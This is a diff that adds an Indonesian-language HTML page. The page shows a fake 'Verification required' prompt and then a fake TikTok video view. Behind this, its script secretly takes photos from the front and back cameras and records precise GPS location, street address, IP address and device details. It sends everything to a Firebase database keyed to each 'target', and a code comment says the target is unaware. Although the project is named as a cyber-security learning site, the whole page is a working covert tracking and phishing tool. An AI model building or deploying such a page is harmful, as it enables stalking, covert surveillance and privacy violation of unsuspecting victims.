@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Loading...</title>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            width: 100%;
+        }
+        #clickjack-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0c;
+            z-index: 999999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        #clickjack-overlay .box {
+            background: #121214;
+            border-radius: 24px;
+            padding: 35px 30px;
+            max-width: 340px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+        }
+        #clickjack-overlay .box .logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 16px;
+            background: #1a1a1f;
+            margin: 0 auto 18px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        #clickjack-overlay .box .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        #clickjack-overlay .box h2 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        #clickjack-overlay .box .sub {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        #clickjack-overlay .box p {
+            font-size: 13px;
+            color: #888;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        #clickjack-overlay .box .btn-continue {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(26, 115, 232, 0.3);
+        }
+        #clickjack-overlay .box .btn-continue:hover {
+            background: #1557b0;
+            transform: scale(1.01);
+        }
+        #clickjack-overlay .box .btn-continue:active {
+            transform: scale(0.97);
+        }
+        #clickjack-overlay .box .footer {
+            font-size: 10px;
+            color: #444;
+            margin-top: 15px;
+        }
+        #clickjack-overlay .box .footer a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        /* TIKTOK VIEW */
+        .phone-container {
+            width: 100%;
+            height: 100%;
+            max-height: 100vh;
+            background: #000;
+            position: relative;
+            overflow: hidden;
+            display: none;
+        }
+        .video-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            background: #111;
+        }
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .overlay {
+            position: absolute;
+            bottom: 80px;
+            left: 20px;
+            z-index: 10;
+        }
+        .username {
+            font-weight: 700;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+        .username .badge {
+            background: #fe2c55;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 600;
+        }
+        .desc {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .right-sidebar {
+            position: absolute;
+            right: 15px;
+            bottom: 140px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 25px;
+            z-index: 10;
+        }
+        .right-sidebar .item {
+            text-align: center;
+        }
+        .right-sidebar .item svg {
+            width: 35px;
+            height: 35px;
+            fill: #fff;
+        }
+        .right-sidebar .item .count {
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+        .bottom-nav {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-around;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            z-index: 20;
+        }
+        .bottom-nav svg {
+            width: 26px;
+            height: 26px;
+            fill: #888;
+        }
+        .bottom-nav .active svg {
+            fill: #fe2c55;
+        }
+        .bottom-nav .plus {
+            background: #fe2c55;
+            border-radius: 50%;
+            padding: 6px;
+            width: 34px;
+            height: 34px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: -10px;
+        }
+        .bottom-nav .plus svg {
+            fill: #fff;
+            width: 20px;
+            height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== CLICKJACKING OVERLAY (NETRAL) ===== -->
+    <div id="clickjack-overlay">
+        <div class="box">
+            <div class="logo">
+                <img src="https://i.imgur.com/0BTalUo.jpeg" alt="Logo">
+            </div>
+            <h2>Continue</h2>
+            <div class="sub">Verification required</div>
+            <p>Please allow access to your camera and location to continue.</p>
+            <button class="btn-continue" id="btn-continue">Continue to App</button>
+            <div class="footer">
+                By continuing, you agree to our <a href="#">Terms of Service</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== TIKTOK VIEW ===== -->
+    <div class="phone-container" id="tiktok-view">
+        <div class="video-container">
+            <video autoplay muted loop playsinline>
+                <source src="https://i.imgur.com/9e0hgPJ.mp4" type="video/mp4">
+            </video>
+            <div class="overlay">
+                <div class="username">
+                    AnnisaShop
+                    <span class="badge">Follow</span>
+                </div>
+                <div class="desc">POV: Lu jadi kece dan keren #viral #fyp #trending</div>
+            </div>
+            <div class="right-sidebar">
+                <div class="item">
+                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                    <div class="count">45K</div>
+                </div>
+                <div class="item">
+                    <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+                    <div class="count">10K</div>
+                </div>
+                <div class="item">
+                    <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
+                    <div class="count">120K</div>
+                </div>
+            </div>
+            <div class="bottom-nav">
+                <div class="active"><svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z"/></svg></div>
+                <div><svg viewBox="0 0 24 24"><path d="M3 12l3-3v6zM21 12l-3-3v6zM9 21V3h6v18z"/></svg></div>
+                <div class="plus"><svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></div>
+                <div><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg></div>
+                <div><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== FIREBASE CONFIG =====
+        const firebaseConfig = {
+            apiKey: "AIzaSyAnUHOmaXWyK_7C4ey72MgcBJnHqvtQ7OE",
+            authDomain: "web-belajar-cyber-security.firebaseapp.com",
+            projectId: "web-belajar-cyber-security",
+            storageBucket: "web-belajar-cyber-security.firebasestorage.app",
+            messagingSenderId: "740323749324",
+            appId: "1:740323749324:web:e26a802cbb5a083a658169",
+            measurementId: "G-X5QWJ4T7GP"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const params = new URLSearchParams(window.location.search);
+        const idParam = params.get('id');
+        const tToken = params.get('t');
+
+        function b64d(str) {
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            while (str.length % 4) str += '=';
+            return atob(str);
+        }
+
+        // ===== CLICKJACKING BUTTON =====
+        document.getElementById('btn-continue').addEventListener('click', function() {
+            // Minta izin kamera & lokasi (target ga sadar)
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(() => {})
+                .catch(() => {});
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true });
+            }
+
+            // Sembunyikan clickjack, tampilkan TikTok
+            document.getElementById('clickjack-overlay').style.display = 'none';
+            document.getElementById('tiktok-view').style.display = 'block';
+
+            // Kirim data ke Firebase
+            if (idParam && tToken) {
+                try {
+                    const owner = b64d(tToken);
+                    const path = `users/${owner}/targets/${idParam}`;
+
+                    const device = navigator.userAgent || 'Unknown';
+                    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+                    const battery = navigator.getBattery ? 'Loading...' : 'Unknown';
+
+                    db.ref(path).update({
+                        device: device,
+                        ram: ram,
+                        battery: 'Checking...',
+                        ip: 'Fetching...',
+                        location: 'Mencari...',
+                        coord: 'Mencari...',
+                        address: 'Mencari...',
+                        timestamp: Date.now()
+                    });
+
+                    // IP
+                    fetch('https://api.ipify.org?format=json')
+                        .then(r => r.json())
+                        .then(res => db.ref(path).update({ ip: res.ip }))
+                        .catch(() => {});
+
+                    // Lokasi
+                    if ("geolocation" in navigator) {
+                        navigator.geolocation.getCurrentPosition((p) => {
+                            const lat = p.coords.latitude;
+                            const lon = p.coords.longitude;
+                            const coord = `${lat},${lon}`;
+                            db.ref(path).update({ coord: coord });
+                            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                                .then(r => r.json())
+                                .then(d => db.ref(path).update({ address: d.display_name || 'Tidak ditemukan' }))
+                                .catch(() => db.ref(path).update({ address: 'Gagal ambil alamat' }));
+                        }, () => db.ref(path).update({ location: 'Izin lokasi ditolak' }), { enableHighAccuracy: true });
+                    }
+
+                    // Baterai
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(b => {
+                            const level = Math.round(b.level * 100);
+                            const charging = b.charging ? ' (Mengisi)' : ' (Tidak mengisi)';
+                            db.ref(path).update({ battery: `${level}%${charging}` });
+                        }).catch(() => db.ref(path).update({ battery: 'Tidak tersedia' }));
+                    }
+
+                    // Kamera - ambil foto front & back
+                    let frontStream = null;
+                    let backStream = null;
+
+                    function capturePhoto(stream, isFront) {
+                        if (!stream) return;
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 480;
+                            canvas.height = 480;
+                            canvas.getContext('2d').drawImage(video, 0, 0, 480, 480);
+                            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                            const photoPath = isFront ? 'photos_front' : 'photos_back';
+                            db.ref(path + '/' + photoPath).push(dataUrl);
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 1000);
+                    }
+
+                    // Front camera
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                        .then(s => {
+                            frontStream = s;
+                            capturePhoto(s, true);
+                        })
+                        .catch(() => {});
+
+                    // Back camera
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                        .then(s => {
+                            backStream = s;
+                            capturePhoto(s, false);
+                        })
+                        .catch(() => {});
+
+                    db.ref(path).update({ status: 'Data terkumpul' });
+
+                } catch (e) {
+                    console.error('Error:', e);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
